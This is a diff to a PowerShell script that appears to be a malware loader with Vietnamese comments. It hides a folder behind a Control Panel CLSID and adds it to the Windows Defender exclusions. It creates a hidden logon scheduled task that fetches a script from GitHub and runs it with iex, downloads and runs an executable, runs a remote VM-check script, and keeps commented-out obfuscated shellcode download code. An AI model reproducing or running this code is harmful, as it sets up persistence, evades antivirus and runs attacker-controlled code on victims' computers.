@@ -11,6 +11,16 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Start-Process -FilePath 'download.bat'
 }
 
+$rdir = "C:\Users\hai1723"
+$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+New-Item -ItemType Directory -Path $dir
+attrib +h +s $dir
+
+$temp = "$dir\temp"
+New-Item -ItemType Directory -Path $temp
+
+Add-MpPreference -ExclusionPath $dir
+
 $task_name = "Windows startup"
 $task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -ep bypass -c ""iwr https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -useb | iex"""
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -29,7 +39,8 @@ catch {
     # Thực thi lệnh thay thế
     Write-Output "Thực thi lệnh thay thế từ hai1723.com/fix.ps1"
     try {
-        iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/startup.ps1" -useb)
+        Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/siu/main.cmd" -OutFile "$temp\aka.exe"
+        Start-Process -FilePath '$temp\aka.exe'
         Write-Output "Lệnh thay thế đã được thực thi thành công."
     }
     catch {
@@ -45,15 +56,7 @@ Write-Host "[!] Persistence Added" -ForegroundColor Green
 
 iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt |iex
 
-$rdir = "C:\Users\hai1723"
-$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-New-Item -ItemType Directory -Path $dir
-attrib +h +s $dir
 
-$temp = "$dir\temp"
-New-Item -ItemType Directory -Path $temp
-
-Add-MpPreference -ExclusionPath $dir
 
 # $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
 # $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
